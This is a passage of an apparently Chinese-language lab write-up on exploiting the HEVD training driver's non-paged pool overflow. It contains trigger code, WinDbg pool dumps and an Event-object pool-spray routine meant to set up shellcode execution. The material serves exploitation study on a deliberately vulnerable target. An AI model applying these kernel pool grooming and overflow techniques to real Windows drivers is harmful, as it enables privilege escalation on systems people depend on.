<div class="highlight" id="id-62"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include&lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1f8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">RtlFillMemory</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Start to get HANDLE...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hDevice</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Failed to get HANDLE!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Success to get HANDLE!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x22200f</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bReturn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>可以看到：</p>
<div class="highlight" id="id-63"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">u</span> <span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerBufferOverflowNonPagedPool</span><span class="o">+</span><span class="mh">0xf7</span> 
</span></span><span class="line"><span class="cl"><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerBufferOverflowNonPagedPool</span><span class="o">+</span><span class="mh">0xf7</span> <span class="p">[</span><span class="nl">c</span><span class="p">:</span><span class="err">\</span><span class="n">projects</span><span class="err">\</span><span class="n">hevd</span><span class="err">\</span><span class="n">driver</span><span class="err">\</span><span class="n">hevd</span><span class="err">\</span><span class="n">bufferoverflownonpagedpool</span><span class="p">.</span><span class="n">c</span> <span class="err">@</span> <span class="mi">137</span><span class="p">]</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="n">a9b1fdc5</span> <span class="n">e812c4fbff</span>      <span class="n">call</span>    <span class="n">HEVD</span><span class="o">!</span><span class="nf">memcpy</span> <span class="p">(</span><span class="n">a9adc1dc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">a9b1fdca</span> <span class="mi">688625</span><span class="n">b2a9</span>      <span class="n">push</span>    <span class="n">offset</span> <span class="n">HEVD</span><span class="o">!</span> <span class="o">??</span> <span class="o">::</span><span class="n">NNGAKEGL</span><span class="o">::</span><span class="err">`</span><span class="n">string</span><span class="err">&#39;</span> <span class="p">(</span><span class="n">a9b22586</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">a9b1fdcf</span> <span class="mi">6</span><span class="n">a03</span>            <span class="n">push</span>    <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">a9b1fdd1</span> <span class="mi">6</span><span class="n">a4d</span>            <span class="n">push</span>    <span class="mi">4</span><span class="n">Dh</span>
</span></span><span class="line"><span class="cl"><span class="n">a9b1fdd3</span> <span class="n">ffd7</span>            <span class="n">call</span>    <span class="n">edi</span>
</span></span><span class="line"><span class="cl"><span class="n">a9b1fdd5</span> <span class="mi">681</span><span class="n">a21b2a9</span>      <span class="n">push</span>    <span class="n">offset</span> <span class="n">HEVD</span><span class="o">!</span> <span class="o">??</span> <span class="o">::</span><span class="n">NNGAKEGL</span><span class="o">::</span><span class="err">`</span><span class="n">string</span><span class="err">&#39;</span> <span class="p">(</span><span class="n">a9b2211a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">a9b1fdda</span> <span class="mf">688e24</span><span class="n">b2a9</span>      <span class="n">push</span>    <span class="n">offset</span> <span class="n">HEVD</span><span class="o">!</span> <span class="o">??</span> <span class="o">::</span><span class="n">NNGAKEGL</span><span class="o">::</span><span class="err">`</span><span class="n">string</span><span class="err">&#39;</span> <span class="p">(</span><span class="n">a9b2248e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">a9b1fddf</span> <span class="mi">6</span><span class="n">a03</span>            <span class="n">push</span>    <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">a9b1fdc5</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">g</span>
</span></span><span class="line"><span class="cl"><span class="o">******</span> <span class="n">HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL</span> <span class="o">******</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Allocating</span> <span class="n">Pool</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Pool</span> <span class="nl">Tag</span><span class="p">:</span> <span class="err">&#39;</span><span class="n">kcaH</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Pool</span> <span class="nl">Type</span><span class="p">:</span> <span class="n">NonPagedPool</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Pool</span> <span class="nl">Size</span><span class="p">:</span> <span class="mh">0x1F8</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Pool</span> <span class="nl">Chunk</span><span class="p">:</span> <span class="mh">0x85A52308</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nl">UserBuffer</span><span class="p">:</span> <span class="mh">0x001FF990</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">UserBuffer</span> <span class="nl">Size</span><span class="p">:</span> <span class="mh">0x1F8</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nl">KernelBuffer</span><span class="p">:</span> <span class="mh">0x85A52308</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">KernelBuffer</span> <span class="nl">Size</span><span class="p">:</span> <span class="mh">0x1F8</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Triggering</span> <span class="n">Buffer</span> <span class="n">Overflow</span> <span class="n">in</span> <span class="n">NonPagedPool</span>
</span></span><span class="line"><span class="cl"><span class="n">Break</span> <span class="n">instruction</span> <span class="n">exception</span> <span class="o">-</span> <span class="n">code</span> <span class="mi">80000003</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerBufferOverflowNonPagedPool</span><span class="o">+</span><span class="mh">0xf7</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="n">a9b1fdc5</span> <span class="n">e812c4fbff</span>      <span class="n">call</span>    <span class="n">HEVD</span><span class="o">!</span><span class="nf">memcpy</span> <span class="p">(</span><span class="n">a9adc1dc</span><span class="p">)</span></span></span></code></pre></div><p>局部变量KernelBuffer为0x85a52308</p>
<p>可以用<code>!pool address</code>命令查看address周围地址处的池信息</p>
<div class="highlight" id="id-64"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="n">pool</span> <span class="mh">0x85a52308</span>
</span></span><span class="line"><span class="cl"><span class="n">Pool</span> <span class="n">page</span> <span class="mi">85</span><span class="n">a52308</span> <span class="n">region</span> <span class="n">is</span> <span class="n">Unknown</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52000</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">138</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>    <span class="mi">0</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">ALPC</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52138</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">10</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">138</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="p">....</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52148</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">70</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">10</span>  <span class="p">(</span><span class="n">Free</span> <span class="p">)</span>  <span class="n">MmRl</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a521b8</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">148</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">70</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">FIPc</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="mi">85</span><span class="n">a52300</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">148</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span> <span class="o">*</span><span class="n">Hack</span>
</span></span><span class="line"><span class="cl">		<span class="n">Owning</span> <span class="nl">component</span> <span class="p">:</span> <span class="nf">Unknown</span> <span class="p">(</span><span class="n">update</span> <span class="n">pooltag</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52500</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="n">Vad</span> 
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52548</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="n">Free</span> <span class="p">)</span>  <span class="n">FIPc</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52588</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">18</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">FOCX</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a525a0</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">48</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">18</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="n">Vad</span> 
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a525e8</span> <span class="nl">size</span><span class="p">:</span>   <span class="n">b8</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">File</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a526a0</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">70</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="nf">b8</span>  <span class="p">(</span><span class="n">Free</span> <span class="p">)</span>  <span class="n">FMfc</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52710</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">3</span><span class="n">b8</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">70</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">CcPL</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52ac8</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">3</span><span class="n">b8</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">Even</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52b08</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">3</span><span class="n">a0</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">FOCX</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52ea8</span> <span class="nl">size</span><span class="p">:</span>   <span class="n">b8</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">3</span><span class="n">a0</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">File</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52f60</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">70</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="nf">b8</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="n">FMfc</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">a52fd0</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">30</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">70</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">FOCX</span></span></span></code></pre></div><p><code>85a52300</code>就是<code>TriggerBufferOverflowNonPagedPool</code>中申请到的池的起始地址，大小为0x200</p>
<p>所以末尾地址为85a52300+200=85a52500，这也是下一个池块的头部所在地址。查看memcpy运行后该地址处的内存：</p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230814034535823.png" alt="image-20230814034535823" srcset="/posts/2023-8-hevd/image-20230814034535823.png?size=small, /posts/2023-8-hevd/image-20230814034535823.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230814034535823.png?size=large 2x" data-title="image-20230814034535823" style="--width: 950px;--aspect-ratio: 950 / 517;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>我们的目标就是构造数据，修改下一个池块的内容，从而达到运行我们的shellcode的目的。</p>
<h4 id="构造溢出池块空间" class="heading-element">
  <a href="#%e6%9e%84%e9%80%a0%e6%ba%a2%e5%87%ba%e6%b1%a0%e5%9d%97%e7%a9%ba%e9%97%b4" class="heading-mark"></a>构造溢出池块空间</h4><p>池块分布是无序的，而我们希望能在非分页内存池中控制池块分布，使得溢出点所在池块后边是我们构建的池块，从而达到溢出利用条件。</p>
<blockquote>
<p>我们知道存储在非分页池中的通用系统数据结构包括表示进程和线程的内核对象，互斥对象，信号量和事件等同步对象，表示为文件对象的文件引用以及I/O请求包（IRP）代表I/O操作。</p>
</blockquote>
<p>Windows 提供了一种<code>Event</code>对象, 该对象存储在非分页池中，可以使用<code>CreateEvent</code> API 来创建：</p>
<div class="highlight" id="id-65"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="nf">CreateEvent</span><span class="p">(</span> 
</span></span><span class="line"><span class="cl">  <span class="n">_In_opt_</span> <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpEventAttributes</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">_In_</span>     <span class="n">BOOL</span>                  <span class="n">bManualReset</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">_In_</span>     <span class="n">BOOL</span>                  <span class="n">bInitialState</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">_In_opt_</span> <span class="n">LPCTSTR</span>               <span class="n">lpName</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></div><p>该函数会生成一个<code>Event</code>事件对象，它的大小为 0x40</p>
<p>因为在刚才的调试中我们知道我们的池大小为 <code>0x1f8 + 8(POOL_HEADER) = 0x200</code>，所以多次申请就刚好可以填满我们的池，如果把池铺满成我们的Event对象，我们再用<code>CloseHandle</code>函数释放一些对象，我们就可以在Event中间留出一些我们可以操控的空间</p>
<p>测试代码：</p>
<div class="highlight" id="id-66"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">Event_Object</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">Pool_Spray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="n">Event_Object</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">CreateEventA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="c1">// 0x40 * 8 = 0x200
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="c1">// 每次[0-7]*n的event空间，而8*n不释放.进而构成ex40*8=x200的空闲空间
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nf">CloseHandle</span><span class="p">(</span><span class="n">Event_Object</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">j</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1f8</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">RtlFillMemory</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Start to get HANDLE...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hDevice</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Failed to get HANDLE!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]Success to get HANDLE!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">Pool_Spray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x22200f</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bReturn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>运行后：</p>
<div class="highlight" id="id-67"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="n">pool</span> <span class="n">KernelBuffer</span>
</span></span><span class="line"><span class="cl"><span class="n">Pool</span> <span class="n">page</span> <span class="mi">85</span><span class="n">b81888</span> <span class="n">region</span> <span class="n">is</span> <span class="n">Nonpaged</span> <span class="n">pool</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81000</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>    <span class="mi">0</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">Even</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81040</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span> <span class="p">)</span>  <span class="nf">Even</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81080</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span> <span class="p">)</span>  <span class="nf">Even</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b810c0</span> <span class="nl">size</span><span class="p">:</span>   <span class="n">c0</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">Even</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81180</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="nf">c0</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">Even</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b811c0</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">Even</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b813c0</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">Even</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81400</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span>  <span class="p">(</span><span class="n">Free</span><span class="p">)</span>       <span class="n">Even</span>
</span></span><span class="line"><span class="cl"> <span class="mi">85</span><span class="n">b81600</span> <span class="nl">size</span><span class="p">:</span>   <span class="mi">40</span> <span class="n">previous</span> <span class="nl">size</span><span class="p">:</span>  <span class="mi">200</span>  <span class="p">(</span><span class="n">Allocated</span><span class="p">)</span>  <span class="nf">Even</span> <span class="p">(</span><span class="n">Protected</span><span class="p">)</span>
